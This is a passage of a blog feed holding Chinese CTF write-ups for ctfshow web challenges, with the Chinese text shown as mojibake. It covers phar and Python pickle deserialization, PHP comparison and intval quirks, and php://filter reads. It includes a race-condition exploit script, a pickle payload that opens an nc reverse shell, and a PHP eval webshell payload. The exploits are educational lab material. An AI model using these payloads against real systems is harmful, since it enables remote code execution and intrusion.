invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºå®Œæˆåæ‰“å¼€</li></ul><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/276.png" alt=""></p><ul><li>éœ€è¦å†™ä¸€ä¸ªè„šæœ¬è¿›è¡Œget flag</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="comment"># è¯»å–pharåŒ…å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPhar</span>(<span class="params">phar</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(phar,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> p:</span><br><span class="line">        <span class="keyword">return</span> p.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥pharåŒ…å†…å®¹</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writePhar</span>(<span class="params">url,data</span>):</span><br><span class="line">    requests.post(url,data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è§¦å‘unlinkçš„pharååºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlinkPhar</span>(<span class="params">url,data</span>):</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    res = requests.post(url,data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> success</span><br><span class="line">    url = <span class="string">&#x27;http://92d61ef2-9ec6-44ba-90c9-59fc50181112.challenge.ctf.show/&#x27;</span></span><br><span class="line">    phar = getPhar(<span class="string">&#x27;phar.phar&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> success <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        w = threading.Thread(target=writePhar,args=(url+<span class="string">&#x27;?fn=p.phar&#x27;</span>,phar))</span><br><span class="line">        u = threading.Thread(target=unlinkPhar,args=(url+<span class="string">&#x27;?fn=phar://p.phar/test&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        w.start()</span><br><span class="line">        u.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="web277-pythonååºåˆ—åŒ–"><a href="#web277-pythonååºåˆ—åŒ–" class="headerlink" title="web277(pythonååºåˆ—åŒ–)"></a>web277(pythonååºåˆ—åŒ–)</h1><p>æ‰“å¼€æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æç¤ºï¼š</p><p><img src="/img/CTFSHOW-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/277.png" alt=""></p><p>å¯ä»¥çœ‹å‡ºè¿™æ˜¯å…³äºpythonçš„ååºåˆ—åŒ–</p><p>å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°æ— å›æ˜¾ï¼Œä¸”<code>os.system</code>ç”¨ä¸äº†ï¼Œå¯ä»¥è¯•è¯•åå¼¹shellï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.popen,(<span class="string">&#x27;nc æœåŠ¡å™¨ip ç«¯å£ -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">url=<span class="string">&quot;http://0efe0f23-3af2-400b-8010-019483f7aced.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>:base64.b64encode(s)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h1 id="web278-è¿‡æ»¤os-system"><a href="#web278-è¿‡æ»¤os-system" class="headerlink" title="web278(è¿‡æ»¤os.system)"></a>web278(è¿‡æ»¤os.system)</h1><p>è¿‡æ»¤äº†<code>os.system</code>ï¼Œå¯ä»¥ç›´æ¥ç”¨ä¸Šé¢˜çš„payloadåˆ©ç”¨åå¼¹shellï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.popen,(<span class="string">&#x27;nc æœåŠ¡å™¨ip ç«¯å£ -e /bin/sh&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">a=exp()</span><br><span class="line">s=pickle.dumps(a)</span><br><span class="line">url=<span class="string">&quot;http://0efe0f23-3af2-400b-8010-019483f7aced.challenge.ctf.show/backdoor&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>:base64.b64encode(s)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url=url,params=params)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW PHPç‰¹æ€§</title>
      <link href="/2023/07/26/CTFSHOW%20PHP%E7%89%B9%E6%80%A7/"/>
      <url>/2023/07/26/CTFSHOW%20PHP%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web89-intval"><a href="#web89-intval" class="headerlink" title="web89(intval)"></a>web89(intval)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num[]=1</code></p><ul><li>preg_match()ï¼šåªèƒ½å¤„ç†å­—ç¬¦ä¸²ï¼Œå½“ä¼ å…¥çš„æ˜¯æ•°ç»„æ—¶ä¼šè¿”å›false</li><li>intval()ï¼šå˜é‡ä¸èƒ½æ˜¯arrayå’Œobjectæ ¼å¼  æˆåŠŸæ—¶è¿”å›varçš„integerå€¼ï¼Œå¤±è´¥æ—¶è¿”å›0ï¼Œç©ºçš„arrayè¿”å›0ï¼Œéç©ºçš„arrayè¿”å›1</li></ul><h1 id="web90-å¼ºæ¯”è¾ƒ"><a href="#web90-å¼ºæ¯”è¾ƒ" class="headerlink" title="web90(å¼ºæ¯”è¾ƒ)"></a>web90(å¼ºæ¯”è¾ƒ)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=4476[a-z or .!@$%^\()ç­‰]</code></p><ul><li>intval()ï¼šå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªä¸æ˜¯æ•°å­—çš„å­—ç¬¦ä¹‹å‰çš„æ•°å­—ä¸²æ‰€ä»£è¡¨çš„æ•´æ•°å€¼ã€‚å¦‚æœå­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªæ˜¯ - ï¼Œåˆ™ä»ç¬¬äºŒä¸ªå¼€å§‹ç®—èµ·</li><li>===ï¼šåœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ</li></ul><h1 id="web91-æ­£åˆ™-m"><a href="#web91-æ­£åˆ™-m" class="headerlink" title="web91(æ­£åˆ™-m)"></a>web91(æ­£åˆ™-m)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;no no no no no&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?cmd=%0aphp</code></p><ul><li>/^php$/ï¼šæ­£åˆ™è¡¨è¾¾å¼ï¼ŒåŒ¹é…å¼€å§‹å’Œç»“æŸä½ç½®ï¼Œç®€å•æ¥è¯´å°±æ˜¯å‚æ•°å€¼ä¸ºphp</li><li>iï¼šä¸åŒºåˆ†å¤§å°å†™</li><li>mï¼šå¤šè¡ŒåŒ¹é…</li></ul><h1 id="web92-å¼±æ¯”è¾ƒ"><a href="#web92-å¼±æ¯”è¾ƒ" class="headerlink" title="web92(å¼±æ¯”è¾ƒ)"></a>web92(å¼±æ¯”è¾ƒ)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$num</span> == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>) == <span class="number">4476</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=010574 or 4476e1</code></p><ul><li>==ï¼šåœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒç±»å‹ï¼Œå†æ¯”è¾ƒ</li></ul><h1 id="web93-è¿›åˆ¶è½¬æ¢"><a href="#web93-è¿›åˆ¶è½¬æ¢" class="headerlink" title="web93(è¿›åˆ¶è½¬æ¢)"></a>web93(è¿›åˆ¶è½¬æ¢)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num=010574</code></p><ul><li>intval():  ç¬¬äºŒä¸ªå‚æ•°ä¸º0æ—¶ï¼Œé€šè¿‡å¯¹å˜é‡æ£€æµ‹æ¥åˆ¤æ–­<ul><li>0b??ï¼šäºŒè¿›åˆ¶</li><li>0???ï¼šå…«è¿›åˆ¶</li><li>0x??ï¼šåå…­è¿›åˆ¶</li></ul></li></ul><h1 id="web94-strpos"><a href="#web94-strpos" class="headerlink" title="web94(strpos)"></a>web94(strpos)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    if($num===&quot;4476&quot;)&#123;</span><br><span class="line">        die(&quot;no no no!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;</span><br><span class="line">        die(&quot;no no no!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(!strpos($num, &quot;0&quot;))&#123;</span><br><span class="line">        die(&quot;no no no!!!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(intval($num,0)===4476)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num= 010574</code></p><ul><li>strpos()ï¼šè¿”å›åœ¨å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æœæ²¡æ‰¾åˆ°è¿”å›false</li></ul><h1 id="web95-strposï¼Œintvalï¼Œ-ï¼Œ"><a href="#web95-strposï¼Œintvalï¼Œ-ï¼Œ" class="headerlink" title="web95(strposï¼Œintvalï¼Œ\=\=ï¼Œ===)"></a>web95(strposï¼Œintvalï¼Œ\=\=ï¼Œ===)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?num= 010574</code></p><h1 id="web96-php-filter"><a href="#web96-php-filter" class="headerlink" title="web96(php://filter/)"></a>web96(php://filter/)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?u=php://filter/resource=flag.php</code></p><ul><li>highlight_file()ï¼šæ‰“å°è¾“å‡ºæˆ–è€…è¿”å›æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç </li><li>åˆ©ç”¨ä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹</li></ul><h1 id="web97-md5"><a href="#web97-md5" class="headerlink" title="web97(md5)"></a>web97(md5)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: a[]=1&amp;b[]=1</code></p><ul><li>md5å¼ºæ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡</li><li>åŸç†ï¼šmd5()å‚æ•°ä¸ºæ•°ç»„æ—¶ï¼Œä¸ä¼šæŠ¥é”™ï¼Œè¿”å›å€¼ä¸ºnull</li></ul><h1 id="web98-amp"><a href="#web98-amp" class="headerlink" title="web98(=&amp;)"></a>web98(=&amp;)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;flag is here&quot;</span>;</span><br><span class="line"><span class="variable">$_GET</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_POST</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_COOKIE</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$_GET</span>=&amp;<span class="variable">$_SERVER</span>:<span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>payload: HTTP_FLAG=flag</code></p><ul><li><code>=&amp;</code>ï¼šå€¼æˆ–å¯¹è±¡éƒ½å°†æŒ‡å‘ç›¸åŒçš„æ•°æ®    å¼•ç”¨</li><li>getå’Œpostéƒ½æŒ‡å‘ç›¸åŒçš„æ•°æ®ï¼Œè€Œgetåˆä¸cookieå’ŒserveræŒ‡å‘ç›¸åŒçš„æ•°æ®ï¼Œä½†é¢˜è¦æ±‚ç”¨getä¼ å‚ï¼Œæ‰€ä»¥ä½¿ç”¨postä¼ å‚æ¥æ›¿ä»£getä¼ å‚</li></ul><h1 id="web99-file-put-contents"><a href="#web99-file-put-contents" class="headerlink" title="web99(file_put_contents)"></a>web99(file_put_contents)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allow</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">36</span>; <span class="variable">$i</span> &lt; <span class="number">0x36d</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="title function_ invoke__">array_push</span>(<span class="variable">$allow</span>, <span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?n=1.php    content=&lt;?php eval($_POST[&#39;x&#39;]);?&gt;    